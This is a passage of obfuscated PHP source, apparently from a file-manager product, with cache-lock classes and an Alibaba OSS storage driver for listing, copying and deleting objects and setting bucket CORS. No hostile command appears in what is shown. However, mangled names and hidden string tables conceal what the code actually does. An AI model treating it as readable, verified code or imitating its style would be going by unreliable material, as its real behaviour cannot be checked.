$á±ñø‚ö = $GLOBALS[$ã¬šúßÊ[6]][$ã¬šúßÊ[426]]; self::$timeout = $á±ñø‚ö[$ã¬šúßÊ[958]] ? $á±ñø‚ö[$ã¬šúßÊ[958]] : 10; $éÒãŸîÏ = _get($GLOBALS[$ã¬šúßÊ[6]], $ã¬šúßÊ[959]); $ŠŸ¾¤”Å = $á±ñø‚ö[$ã¬šúßÊ[941]] ? $á±ñø‚ö[$ã¬šúßÊ[941]] : $ã¬šúßÊ[232]; if ($ŠŸ¾¤”Å == $ã¬šúßÊ[21] && $éÒãŸîÏ == $ã¬šúßÊ[13]) { $ŠŸ¾¤”Å = $ã¬šúßÊ[232]; } switch ($ŠŸ¾¤”Å) { case $ã¬šúßÊ[944]: self::$handle = new CacheLockRedis(); break; case $ã¬šúßÊ[945]: self::$handle = new CacheLockMemcached(); break; case $ã¬šúßÊ[21]: self::$handle = new CacheLockDatabase(); break; case $ã¬šúßÊ[232]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ã¬šúßÊ[960], $ã¬šúßÊ[961]); } return self::$handle; } private static function key($…“ìä‘—) { return $_SERVER[Ï×Œõ”û][962] . Cache::key($…“ìä‘—); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ñáÂƒ›­ = '') { self::$errorMsg = $ñáÂƒ›­; } public static function lockGlobal($Ñ·ö’È§, $•û–Ÿ£¼) { return self::lock($Ñ·ö’È§, $•û–Ÿ£¼, !0); } public static function lock($ƒÌçñÊ¼, $ûÓ©ığÉ = false, $ËÏİô¾¢ = false) { $–Áˆ†ï• =& $_SERVER[Ï×Œõ”û]; $óŞÚÅÜ´ = self::init(); $¶¢†İ†• = self::key($ƒÌçñÊ¼); $ûÓ©ığÉ = $ûÓ©ığÉ ? $ûÓ©ığÉ : self::$timeout; $à”Õñôü = timeFloat(); if (_get($GLOBALS, $–Áˆ†ï•[963], !1)) { if (!$óŞÚÅÜ´->lock($¶¢†İ†•, 0.2)) { die; } return !0; } $éåàçû = $óŞÚÅÜ´->lock($¶¢†İ†•, $ûÓ©ığÉ); $’¬›Î–à = timeFloat(); if (!$éåàçû) { $ØÎı³® = "\x6c\x6f\143\153\40\x65\x72\x72\x6f\162\73\153\x65\171\75{$ƒÌçñÊ¼}\x3b\164\x69\155\x65\75{$ûÓ©ığÉ}\73" . self::$errorMsg . $–Áˆ†ï•[74] . get_caller_msg(); $î¸Ö–Ú€ = LNG($–Áˆ†ï•[964]) . "\50{$ûÓ©ığÉ}\163\x29\56" . LNG($–Áˆ†ï•[965]); $î¸Ö–Ú€ .= $–Áˆ†ï•[966]; if (is_string(self::$errorMsg) && self::$errorMsg) { $î¸Ö–Ú€ = $î¸Ö–Ú€ . $–Áˆ†ï•[967] . self::$errorMsg; } write_log($–Áˆ†ï•[968] . sprintf($–Áˆ†ï•[969], timeFloat() - $à”Õñôü) . $–Áˆ†ï•[970] . $ØÎı³® . $–Áˆ†ï•[971] . json_encode(error_get_last()), $–Áˆ†ï•[961]); show_json($î¸Ö–Ú€, !1); } if (!$ËÏİô¾¢) { self::$lockItem[$¶¢†İ†•] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ö«¨³éâ = number_format(timeFloat() - $’¬›Î–à, 3); write_log($–Áˆ†ï•[972] . $ƒÌçñÊ¼ . $–Áˆ†ï•[973] . $ö«¨³éâ, $–Áˆ†ï•[961]); } return $éåàçû; } public static function lockGet($”¿ƒÀ€Ê) { $³æøï“¬ = self::key($”¿ƒÀ€Ê); if (self::$lockItem[$³æøï“¬]) { return self::$lockItem[$³æøï“¬]; } return self::init()->lockGet($³æøï“¬); } public static function unlock($Ş´³Àè½) { $™½Ë¡÷á =& $_SERVER[Ï×Œõ”û]; $¦ªÃ¤Û = self::key($Ş´³Àè½); self::$lockItem[$¦ªÃ¤Û] = null; self::init()->unlock($¦ªÃ¤Û); if (GLOBAL_DEBUG_LOG_ALL) { write_log($™½Ë¡÷á[974] . $Ş´³Àè½, $™½Ë¡÷á[961]); } return; } public static function unlockRuntime() { $‹€òØÇ =& $_SERVER[Ï×Œõ”û]; $àæ˜Õª = self::init(); $‰Î”ÃŞ› = !1; foreach (self::$lockItem as $áƒÚúğˆ => $í‰ß°¶) { if (!$í‰ß°¶) { continue; } $àæ˜Õª->unlock($áƒÚúğˆ); if (!$‰Î”ÃŞ›) { $‰Î”ÃŞ› = !0; write_log($‹€òØÇ[975] . $áƒÚúğˆ . $‹€òØÇ[74] . get_caller_msg(), $‹€òØÇ[961]); continue; } write_log($‹€òØÇ[975] . $áƒÚúğˆ, $‹€òØÇ[961]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $’×óØÈ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($‹€òØÇ[976] . $’×óØÈ . $‹€òØÇ[977] . ACTION, $‹€òØÇ[961]); } } public static function fileLock($¤¡ú€×š) { $·êÅ”¯ =& $_SERVER[Ï×Œõ”û]; if (!$GLOBALS[$·êÅ”¯[978]]) { $GLOBALS[$·êÅ”¯[978]] = array(); } $GLOBALS[$·êÅ”¯[978]][$¤¡ú€×š] = !1; $êîÌô¾œ = fopen(DATA_PATH . $¤¡ú€×š . $·êÅ”¯[979], $·êÅ”¯[980]); if (!$êîÌô¾œ) { return !1; } $GLOBALS[$·êÅ”¯[978]][$¤¡ú€×š] = $êîÌô¾œ; if (flock($êîÌô¾œ, LOCK_EX)) { return !0; } self::unlock($¤¡ú€×š); show_json($·êÅ”¯[981], !1); return !1; } public static function fileUnlock($ñÖ”ÏœÄ) { $Æ•°ü¾Ê =& $_SERVER[Ï×Œõ”û]; $Ğ»àô…œ = $GLOBALS[$Æ•°ü¾Ê[978]][$ñÖ”ÏœÄ]; if (!$Ğ»àô…œ) { return; } $GLOBALS[$Æ•°ü¾Ê[978]][$ñÖ”ÏœÄ] = !1; flock($Ğ»àô…œ, LOCK_UN); fclose($Ğ»àô…œ); } public static function fileUnlockAll() { $ñô­ˆÒ =& $_SERVER[Ï×Œõ”û]; if (!isset($GLOBALS[$ñô­ˆÒ[978]]) || !$GLOBALS[$ñô­ˆÒ[978]]) { return; } foreach ($GLOBALS[$ñô­ˆÒ[978]] as $Œ™Ïì©Í => $È¬Åêİ) { if (!$È¬Åêİ) { continue; } $GLOBALS[$ñô­ˆÒ[978]][$Œ™Ïì©Í] = !1; flock($È¬Åêİ, LOCK_UN); fclose($È¬Åêİ); } $GLOBALS[$ñô­ˆÒ[978]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ï€ÃÔÈó =& $_SERVER[Ï×Œõ”û]; $¥ô´¯ûÙ = $GLOBALS[$ï€ÃÔÈó[6]][$ï€ÃÔÈó[426]]; self::$cachePath = $¥ô´¯ûÙ[$ï€ÃÔÈó[232]][$ï€ÃÔÈó[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¡¼ˆ¨¢Ò, $Ó¶Ûú³ = 0) { $øÁ¹¾Ÿà =& $_SERVER[Ï×Œõ”û]; $ñ»†§“ñ = microtime(!0); $°š£†à = $ñ»†§“ñ + $Ó¶Ûú³ + 0.0001; $ı»’²§ç = rtrim(self::$cachePath, $øÁ¹¾Ÿà[8]) . $øÁ¹¾Ÿà[982] . md5($¡¼ˆ¨¢Ò) . $øÁ¹¾Ÿà[979]; if (file_exists($ı»’²§ç) && filemtime($ı»’²§ç) && filemtime($ı»’²§ç) < time() - 10) { @unlink($ı»’²§ç); } do { if (file_exists($ı»’²§ç)) { cacheLockWait(); continue; } $èšÙâÏÙ = fopen($ı»’²§ç, $øÁ¹¾Ÿà[983]); if (!$èšÙâÏÙ) { return !1; } $µ‰½ÏÂ = flock($èšÙâÏÙ, LOCK_EX | LOCK_NB); self::$caches[$¡¼ˆ¨¢Ò] = array($øÁ¹¾Ÿà[984] => $èšÙâÏÙ, $øÁ¹¾Ÿà[232] => $ı»’²§ç); fwrite($èšÙâÏÙ, $°š£†à); clearstatcache(); if ($èšÙâÏÙ && $µ‰½ÏÂ) { return !0; } cacheLockWait(); } while (microtime(!0) < $°š£†à); $this->unlock($¡¼ˆ¨¢Ò); return !1; } public function lockGet($Úˆ­€“¹) { $¬´›õá =& $_SERVER[Ï×Œõ”û]; $úèô¢ìß = rtrim(self::$cachePath, $¬´›õá[8]) . $¬´›õá[982] . md5($Úˆ­€“¹) . $¬´›õá[979]; return file_exists($úèô¢ìß); } public function unlock($Ç‘­¨ëë) { $õû…¸—© =& $_SERVER[Ï×Œõ”û]; $­ºŠÚ¢î = self::$caches[$Ç‘­¨ëë]; if (!$­ºŠÚ¢î) { return; } @flock($­ºŠÚ¢î[$õû…¸—©[984]], LOCK_UN); @fclose($­ºŠÚ¢î[$õû…¸—©[984]]); @unlink($­ºŠÚ¢î[$õû…¸—©[232]]); unset(self::$caches[$Ç‘­¨ëë]); } } goto E›¡Äİ¡Ó±; d³¥Óø¦ßÆ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($Ü…Œéü†) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ï×Œõ”û][1624]; $this->_init($Ü…Œéü†); } public function _init($—º¢îÏ™) { $ƒÂ»í =& $_SERVER[Ï×Œõ”û]; $this->config = $—º¢îÏ™; foreach ($—º¢îÏ™ as $ ŠåƒÏŞ => $…‘Ø¡˜º) { if (isset($this->{$ ŠåƒÏŞ})) { $this->{$ ŠåƒÏŞ} = $…‘Ø¡˜º; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ƒÂ»í[1625] . LNG($ƒÂ»í[1626])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $½ïŠÚöñ =& $_SERVER[Ï×Œõ”û]; $âÇıÄ•ú = new OSS\Model\CorsConfig(); $Æƒ³×èÇ = new OSS\Model\CorsRule(); $Æƒ³×èÇ->addAllowedOrigin($½ïŠÚöñ[1627]); $Æƒ³×èÇ->addAllowedMethod($½ïŠÚöñ[1628]); $Æƒ³×èÇ->addAllowedMethod($½ïŠÚöñ[1629]); $Æƒ³×èÇ->addAllowedMethod($½ïŠÚöñ[1630]); $Æƒ³×èÇ->addAllowedMethod($½ïŠÚöñ[1631]); $Æƒ³×èÇ->addAllowedMethod($½ïŠÚöñ[164]); $Æƒ³×èÇ->setMaxAgeSeconds(600); $Æƒ³×èÇ->addExposeHeader($½ïŠÚöñ[1632]); $Æƒ³×èÇ->addAllowedHeader($½ïŠÚöñ[1627]); $âÇıÄ•ú->addRule($Æƒ³×èÇ); try { $this->client->putBucketCors($this->bucket, $âÇıÄ•ú); } catch (OSS\Core\OssException $¡òÅšœ) { $this->writeLog(__FUNCTION__ . $½ïŠÚöñ[214] . $¡òÅšœ->getMessage()); return !1; } return !0; } public function getBucketCors() { $¿¯º¬Ùå =& $_SERVER[Ï×Œõ”û]; $ˆ·ûÓ§ª = null; try { $ˆ·ûÓ§ª = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ÀÒˆÓÈŸ) { $this->writeLog(__FUNCTION__ . $¿¯º¬Ùå[214] . $ÀÒˆÓÈŸ->getMessage()); return null; } if (!$ˆ·ûÓ§ª || !($¢«˜äµ = $ˆ·ûÓ§ª->getRules())) { return null; } $…“Ìšóí = $¢«˜äµ[0]->getAllowedOrigins(); $åÂÚÒó = $¢«˜äµ[0]->getAllowedMethods(); $´ãˆ“…Ş = $¢«˜äµ[0]->getMaxAgeSeconds(); $û‡¿‹ = $¢«˜äµ[0]->getExposeHeaders(); $ú´ùä‰× = $¢«˜äµ[0]->getAllowedHeaders(); return array($¿¯º¬Ùå[220] => isset($…“Ìšóí[0]) ? $…“Ìšóí[0] : $¿¯º¬Ùå[12], $¿¯º¬Ùå[224] => $åÂÚÒó, $¿¯º¬Ùå[1633] => $´ãˆ“…Ş, $¿¯º¬Ùå[1634] => isset($û‡¿‹[0]) ? $û‡¿‹[0] : $¿¯º¬Ùå[12], $¿¯º¬Ùå[221] => isset($ú´ùä‰×[0]) ? $ú´ùä‰×[0] : $¿¯º¬Ùå[12]); } public function isBucketCors() { $êŸš®ƒ± =& $_SERVER[Ï×Œõ”û]; $Ú€æŸü = $this->getBucketCors(); if (!$Ú€æŸü || !is_array($Ú€æŸü)) { return !1; } if ($Ú€æŸü[$êŸš®ƒ±[220]] != $êŸš®ƒ±[222] || $Ú€æŸü[$êŸš®ƒ±[221]] != $êŸš®ƒ±[222]) { return !1; } $ÌíÒì° = array_map($êŸš®ƒ±[223], $Ú€æŸü[$êŸš®ƒ±[224]]); if (!is_array($ÌíÒì°)) { $ÌíÒì° = array(); } $÷ì¿â = array($êŸš®ƒ±[225], $êŸš®ƒ±[226], $êŸš®ƒ±[227], $êŸš®ƒ±[228], $êŸš®ƒ±[229]); $¦œ¿õó = array_diff($÷ì¿â, $ÌíÒì°); return empty($¦œ¿õó); } public function mkfile($±®Öœ£î, $á±«”ŠÉ = '', $Ò©•…¹Ú = REPEAT_RENAME) { $Òßç¾‘š = $this->setContent($±®Öœ£î, $á±«”ŠÉ); if ($Òßç¾‘š !== !1) { return $this->getPathOuter($±®Öœ£î); } return !1; } public function mkdir($¹İğÁè, $à‘”Äô¼ = REPEAT_SKIP) { if ($à‘”Äô¼ && $this->_isFolder($¹İğÁè)) { return $this->getPathOuter($¹İğÁè); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($¹İğÁè)); } catch (OSS\Core\OssException $Á‰ÃÈ·²) { $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][214] . $Á‰ÃÈ·²->getMessage()); return !1; } return $this->getPathOuter($¹İğÁè); } private function fileList($ÚëÉ‹÷—, $üÕªç¬Í = '', $€’„âî = 0) { $ØŠ¾ÇÎ =& $_SERVER[Ï×Œõ”û]; $ÚëÉ‹÷— = trim($ÚëÉ‹÷—, $ØŠ¾ÇÎ[8]); $åÄ’®âÃ = empty($ÚëÉ‹÷—) && $ÚëÉ‹÷— !== $ØŠ¾ÇÎ[230] ? $ØŠ¾ÇÎ[12] : $ÚëÉ‹÷— . $ØŠ¾ÇÎ[8]; $İıİÚ = $ØŠ¾ÇÎ[12]; $”Ûû ïÛ = 1000; $¹Ù“êïØ = $³¼âÄ‘ = array(); while (!0) { check_abort(); $©¨¥§Ìë = array($ØŠ¾ÇÎ[1635] => $üÕªç¬Í, $ØŠ¾ÇÎ[1636] => $åÄ’®âÃ, $ØŠ¾ÇÎ[1637] => $”Ûû ïÛ, $ØŠ¾ÇÎ[1638] => $İıİÚ); try { $Ï÷°¶¶ˆ = $this->client->listObjects($this->bucket, $©¨¥§Ìë); } catch (OSS\Core\OssException $ÒÓî®¶¸) { $this->writeLog(__FUNCTION__ . $ØŠ¾ÇÎ[214] . $ÒÓî®¶¸->getMessage()); break; } $İıİÚ = $Ï÷°¶¶ˆ->getNextMarker(); $ÉÓó«Ó = $Ï÷°¶¶ˆ->getObjectList(); $ÄŞÅ¹èÃ = $Ï÷°¶¶ˆ->getPrefixList(); foreach ($ÉÓó«Ó as $×ş‰¨öğ) { if ($×ş‰¨öğ->getKey() == $åÄ’®âÃ) { continue; } $Ë¤›òëŠ = $×ş‰¨öğ->getKey(); $üß‰”ëò = $×ş‰¨öğ->getSize(); $×‡ş´£³ = $×ş‰¨öğ->getLastModified(); $®ÄÌúø = trim($×ş‰¨öğ->getETag(), $ØŠ¾ÇÎ[119]); $Ÿú”Êú— = $€’„âî ? array($ØŠ¾ÇÎ[32] => $Ë¤›òëŠ, $ØŠ¾ÇÎ[79] => $üß‰”ëò, $ØŠ¾ÇÎ[206] => strtotime($×‡ş´£³), $ØŠ¾ÇÎ[1639] => $®ÄÌúø) : $Ë¤›òëŠ; $åÔ©¾¬¶ = $üß‰”ëò == 0 && substr($Ë¤›òëŠ, strlen($Ë¤›òëŠ) - 1, 1) == $ØŠ¾ÇÎ[8] ? !0 : !1; $¶ØƒÉŠ = array($ØŠ¾ÇÎ[79] => $üß‰”ëò, $ØŠ¾ÇÎ[1640] => $üß‰”ëò, $ØŠ¾ÇÎ[88] => strtotime($×‡ş´£³), $ØŠ¾ÇÎ[1641] => $×‡ş´£³, $ØŠ¾ÇÎ[1639] => $®ÄÌúø); $this->cacheMethodInfoSet($Ë¤›òëŠ, $åÔ©¾¬¶, $¶ØƒÉŠ); if ($åÔ©¾¬¶) { $¹Ù“êïØ[] = $Ë¤›òëŠ; continue; } $³¼âÄ‘[] = $Ÿú”Êú—; } foreach ($ÄŞÅ¹èÃ as $íƒ©’ßß) { $¹Ù“êïØ[] = $íƒ©’ßß->getPrefix(); $this->cacheMethodInfoSet($íƒ©’ßß->getPrefix(), !0); } if ($İıİÚ === $ØŠ¾ÇÎ[12]) { break; } } $this->cacheMethodInfoSet($ÚëÉ‹÷—, !0); return array($ØŠ¾ÇÎ[85] => $¹Ù“êïØ, $ØŠ¾ÇÎ[86] => $³¼âÄ‘); } public function listObject($Å‡ë“í¤, $àÓ»óº = '') { $¿Á–ÑÅ =& $_SERVER[Ï×Œõ”û]; $Å‡ë“í¤ = trim($Å‡ë“í¤, $¿Á–ÑÅ[8]); $ÍÉÄ»î¦ = empty($Å‡ë“í¤) && $Å‡ë“í¤ !== $¿Á–ÑÅ[230] ? $¿Á–ÑÅ[12] : $Å‡ë“í¤ . $¿Á–ÑÅ[8]; $ÔøÒ«¹… = $¿Á–ÑÅ[12]; $ç¦ºÑË¿ = 1000; $ßØ¾¹È– = $’ÎØĞñï = array(); while (!0) { check_abort(); $ôŸìÌÛ = array($¿Á–ÑÅ[1635] => $àÓ»óº, $¿Á–ÑÅ[1636] => $ÍÉÄ»î¦, $¿Á–ÑÅ[1637] => $ç¦ºÑË¿, $¿Á–ÑÅ[1638] => $ÔøÒ«¹…); try { $Ø—Ô” Å = $this->client->listObjects($this->bucket, $ôŸìÌÛ); } catch (OSS\Core\OssException $ë™‡²) { $this->writeLog(__FUNCTION__ . $¿Á–ÑÅ[214] . $ë™‡²->getMessage()); break; } $ÔøÒ«¹… = $Ø—Ô” Å->getNextMarker(); $¾Ô×í€ = $Ø—Ô” Å->getObjectList(); foreach ($¾Ô×í€ as $´óè‰ï) { if ($´óè‰ï->getKey() == $ÍÉÄ»î¦) { continue; } $´ãÛóÑ¿ = $´óè‰ï->getKey(); $ÊŞû¿Îø = $´óè‰ï->getSize(); $¬®–³— = $ÊŞû¿Îø == 0 && substr($´ãÛóÑ¿, strlen($´ãÛóÑ¿) - 1, 1) == $¿Á–ÑÅ[8] ? !0 : !1; if ($¬®–³—) { continue; } $’ÎØĞñï[] = $ÊŞû¿Îø . $¿Á–ÑÅ[214] . $´ãÛóÑ¿; } if ($ÔøÒ«¹… === $¿Á–ÑÅ[12]) { break; } } return array($¿Á–ÑÅ[85] => $ßØ¾¹È–, $¿Á–ÑÅ[86] => $’ÎØĞñï); } public function copyFile($œî¨¸, $øùÂå‹) { $÷£õòÈ = $this->size($œî¨¸); if ($÷£õòÈ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $œî¨¸, $this->bucket, $this->pathEncode($øùÂå‹)); } catch (OSS\Core\OssException $­§İ†ãƒ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][214] . $­§İ†ãƒ->getMessage()); return !1; } return $this->getPathOuter($øùÂå‹); } $üÜÎ‡û = $this->multiCopyObject($œî¨¸, $øùÂå‹, $÷£õòÈ); return $üÜÎ‡û ? $this->getPathOuter($øùÂå‹) : !1; } private function multiCopyObject($İÁËõ¢Ä, $¹ñºÖ“™, $±ÁƒªøÀ) { $‘Á±øû² =& $_SERVER[Ï×Œõ”û]; try { $Ãî¯´ = array(); if ($èÅóŠÈÖ = $this->hashMd5($İÁËõ¢Ä)) { $Ãî¯´ = array(OSS\OssClient::OSS_HEADERS => array($‘Á±øû²[1642] => $èÅóŠÈÖ)); } $™¶ƒºòÆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¹ñºÖ“™), $Ãî¯´); $À¥¡©íâ = 1; $Á¾èßÚ = 0; $ìÛòèë“ = array(); $„š°Š›ˆ = 1024 * 1024 * 10; $Ìº‚ƒ¡™ = $this->client->generateMultiuploadParts($±ÁƒªøÀ, $„š°Š›ˆ); foreach ($Ìº‚ƒ¡™ as $—¼ô´ˆÆ => $êú¥åÍ³) { $ô©§„Í§ = $Á¾èßÚ + (int) $êú¥åÍ³[$‘Á±øû²[1643]]; $ÎœøÊôÖ = (int) $êú¥åÍ³[$‘Á±øû²[414]] + $ô©§„Í§ - 1; $Ó†ˆ¿‰¶ = array($‘Á±øû²[166] => $ô©§„Í§, $‘Á±øû²[167] => $ÎœøÊôÖ); $ìÛòèë“[] = $this->client->uploadPartCopy($this->bucket, $İÁËõ¢Ä, $this->bucket, $this->pathEncode($¹ñºÖ“™), $À¥¡©íâ, $™¶ƒºòÆ, $Ó†ˆ¿‰¶); $À¥¡©íâ = $À¥¡©íâ + 1; } $ĞÄûÈ¸ò = array(); foreach ($ìÛòèë“ as $—¼ô´ˆÆ => $Í–•÷”) { $ĞÄûÈ¸ò[] = array($‘Á±øû²[299] => $—¼ô´ˆÆ + 1, $‘Á±øû²[300] => $Í–•÷”); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($¹ñºÖ“™), $™¶ƒºòÆ, $ĞÄûÈ¸ò); } catch (OSS\Core\OssException $´ó£¸Í) { $this->writeLog(__FUNCTION__ . $‘Á±øû²[214] . $´ó£¸Í->getMessage()); return !1; } return !0; } public function moveFile($ò•Æô•à, $¿€æ”òş) { if ($this->copyFile($ò•Æô•à, $¿€æ”òş)) { $this->remove($ò•Æô•à); return $this->getPathOuter($¿€æ”òş); } return !1; } public function delFile($á’å¨ë½) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($á’å¨ë½)); } catch (OSS\Core\OssException $ü®Ó÷ÖÆ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][214] . $ü®Ó÷ÖÆ->getMessage()); return !1; } return !0; } public function delFolder($üåÚ€Ê) { $…úµ¹Èç =& $_SERVER[Ï×Œõ”û]; if (!$this->exist($üåÚ€Ê)) { return !0; } $this->listItemCache = !1; $‹©ï¡›Î = $this->fileList($üåÚ€Ê); $this->listItemCache = !0; $˜©¤¬ïÏ = trim($üåÚ€Ê, $…úµ¹Èç[8]) . $…úµ¹Èç[8]; if (!empty($üåÚ€Ê) && $üåÚ€Ê !== $…úµ¹Èç[230] && !in_array($˜©¤¬ïÏ, $‹©ï¡›Î[$…úµ¹Èç[85]])) { $‹©ï¡›Î[$…úµ¹Èç[85]][] = $˜©¤¬ïÏ; } $ËÉæÜÄ = $this->delByBatch($‹©ï¡›Î[$…úµ¹Èç[86]]); if (!$ËÉæÜÄ) { return !1; } $ËÉæÜÄ = $this->delByBatch($‹©ï¡›Î[$…úµ¹Èç[85]]); if (!$ËÉæÜÄ) { return !1; } return $this->delFile($˜©¤¬ïÏ); } private function delByBatch($éÃÎß¾ò) { foreach (array_chunk($éÃÎß¾ò, 1000) as $Ã¨¯ßãÑ) { try { $this->client->deleteObjects($this->bucket, $Ã¨¯ßãÑ); } catch (OSS\Core\OssException $Ş“‘ì½©) { $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][214] . $Ş“‘ì½©->getMessage()); return !1; } } return !0; } public function rename($§Õâá•é, $ó§íó†) { return $this->renameObject($§Õâá•é, $ó§íó†); } private function fileInfo($Âİ˜‰ış, $¤—”Íè = false, $”Ûã–Š = array()) { $±ï€Şî† =& $_SERVER[Ï×Œõ”û]; $ÇöĞ°Ş® = array($±ï€Şî†[32] => $this->pathThis($Âİ˜‰ış), $±ï€Şî†[87] => $this->getPathOuter($Âİ˜‰ış), $±ï€Şî†[33] => $±ï€Şî†[232], $±ï€Şî†[79] => isset($”Ûã–Š[$±ï€Şî†[79]]) ? $”Ûã–Š[$±ï€Şî†[79]] : 0, $±ï€Şî†[168] => $this->ext($Âİ˜‰ış)); if ($¤—”Íè) { return $ÇöĞ°Ş®; } $ÇöĞ°Ş®[$±ï€Şî†[233]] = $ÇöĞ°Ş®[$±ï€Şî†[88]] = 0; $ÇöĞ°Ş®[$±ï€Şî†[234]] = $ÇöĞ°Ş®[$±ï€Şî†[235]] = !0; if (empty($”Ûã–Š)) { $î²ÂÉÑ³ = $this->objectMeta($Âİ˜‰ış); if (!$î²ÂÉÑ³) { return $ÇöĞ°Ş®; } $”Ûã–Š = array($±ï€Şî†[88] => strtotime($î²ÂÉÑ³[$±ï€Şî†[1641]]), $±ï€Şî†[79] => $î²ÂÉÑ³[$±ï€Şî†[1640]] + 0, $±ï€Şî†[1639] => $î²ÂÉÑ³[$±ï€Şî†[1639]]); } if (isset($”Ûã–Š[$±ï€Şî†[1639]]) && $”Ûã–Š[$±ï€Şî†[1639]]) { $ÇöĞ°Ş®[$±ï€Şî†[237]] = trim($”Ûã–Š[$±ï€Şî†[1639]], $±ï€Şî†[119]); } if (isset($”Ûã–Š[$±ï€Şî†[79]])) { $ÇöĞ°Ş®[$±ï€Şî†[79]] = $”Ûã–Š[$±ï€Şî†[79]]; } if (isset($”Ûã–Š[$±ï€Şî†[88]])) { $ÇöĞ°Ş®[$±ï€Şî†[88]] = $”Ûã–Š[$±ï€Şî†[88]]; } if (isset($”Ûã–Š[$±ï€Şî†[206]]) && !trim($ÇöĞ°Ş®[$±ï€Şî†[88]])) { $ÇöĞ°Ş®[$±ï€Şî†[88]] = $”Ûã–Š[$±ï€Şî†[206]]; } return $ÇöĞ°Ş®; } private function folderInfo($ĞÔŸ“…˜, $Ã®¶²ú‹ = false, $óÁ¤…Ğ  = array()) { $îßµ×²õ =& $_SERVER[Ï×Œõ”û]; $«üÆ¶ô = array($îßµ×²õ[32] => $this->pathThis($ĞÔŸ“…˜), $îßµ×²õ[87] => $this->getPathOuter($îßµ×²õ[8] . $ĞÔŸ“…˜), $îßµ×²õ[33] => $îßµ×²õ[78]); if ($Ã®¶²ú‹) { return $«üÆ¶ô; } $«üÆ¶ô[$îßµ×²õ[233]] = $«üÆ¶ô[$îßµ×²õ[88]] = 0; $«üÆ¶ô[$îßµ×²õ[234]] = $«üÆ¶ô[$îßµ×²õ[235]] = !0; if (empty($óÁ¤…Ğ )) { $ĞÔŸ“…˜ = rtrim($ĞÔŸ“…˜, $îßµ×²õ[8]) . $îßµ×²õ[8]; $î÷Ÿ²› = $this->objectMeta($ĞÔŸ“…˜); if (!$î÷Ÿ²›) { return $«üÆ¶ô; } $óÁ¤…Ğ  = array($îßµ×²õ[233] => $î÷Ÿ²›[$îßµ×²õ[600]][$îßµ×²õ[1644]], $îßµ×²õ[88] => strtotime($î÷Ÿ²›[$îßµ×²õ[1641]])); } if (isset($óÁ¤…Ğ [$îßµ×²õ[88]])) { $«üÆ¶ô[$îßµ×²õ[88]] = $óÁ¤…Ğ [$îßµ×²õ[88]]; } if (isset($óÁ¤…Ğ [$îßµ×²õ[233]])) { $«üÆ¶ô[$îßµ×²õ[233]] = $óÁ¤…Ğ [$îßµ×²õ[233]]; } return $«üÆ¶ô; } public function listPath($ßóôÄÁ, $ÜÌÊÜ„ö = false) { $îí¹ÜÅå =& $_SERVER[Ï×Œõ”û]; $–‚‚º¨» = $this->fileList($ßóôÄÁ, $îí¹ÜÅå[8], !0); foreach ($–‚‚º¨»[$îí¹ÜÅå[85]] as $´ôù×—ç => $Ï‰Ñä‘˜) { $–‚‚º¨»[$îí¹ÜÅå[85]][$´ôù×—ç] = $this->folderInfo($Ï‰Ñä‘˜, $ÜÌÊÜ„ö, $Ï‰Ñä‘˜); } foreach ($–‚‚º¨»[$îí¹ÜÅå[86]] as $´ôù×—ç => $Ï‰Ñä‘˜) { $–‚‚º¨»[$îí¹ÜÅå[86]][$´ôù×—ç] = $this->fileInfo($Ï‰Ñä‘˜[$îí¹ÜÅå[32]], $ÜÌÊÜ„ö, $Ï‰Ñä‘˜); } return $–‚‚º¨»; } protected function infoChildren($ÇÛ ¯€, &$ß¦Áá¤©) { $«Û²İ™ =& $_SERVER[Ï×Œõ”û]; $Ÿ¿¡»ô  = $this->fileList($ÇÛ ¯€, $«Û²İ™[12], !0); $ß¦Áá¤©[$«Û²İ™[81]] += count($Ÿ¿¡»ô [$«Û²İ™[85]]); $ß¦Áá¤©[$«Û²İ™[80]] += count($Ÿ¿¡»ô [$«Û²İ™[86]]); foreach ($Ÿ¿¡»ô [$«Û²İ™[86]] as $ãÒÂôõ) { if (!$ãÒÂôõ || !$ãÒÂôõ[$«Û²İ™[79]]) { continue; } $ß¦Áá¤©[$«Û²İ™[79]] += $ãÒÂôõ[$«Û²İ™[79]]; } } public function has($¯™´µĞ¯, $Ë¬İõ = false, $ôÓÜÑ°é = true) { $Ï¬¯÷ÆÕ =& $_SERVER[Ï×Œõ”û]; $¯™´µĞ¯ = trim($¯™´µĞ¯, $Ï¬¯÷ÆÕ[8]); $Û®Ç‚Ÿº = empty($¯™´µĞ¯) && $¯™´µĞ¯ !== $Ï¬¯÷ÆÕ[230] ? $Ï¬¯÷ÆÕ[12] : $¯™´µĞ¯ . $Ï¬¯÷ÆÕ[8]; $”…±Üè© = $Ï¬¯÷ÆÕ[12]; $Ìı÷å¤í = 500; $Ş‡ÌÎê¸ = $Ú½¡¿éĞ = 0; while (!0) { check_abort(); $¥€‡úÇÊ = array($Ï¬¯÷ÆÕ[1635] => 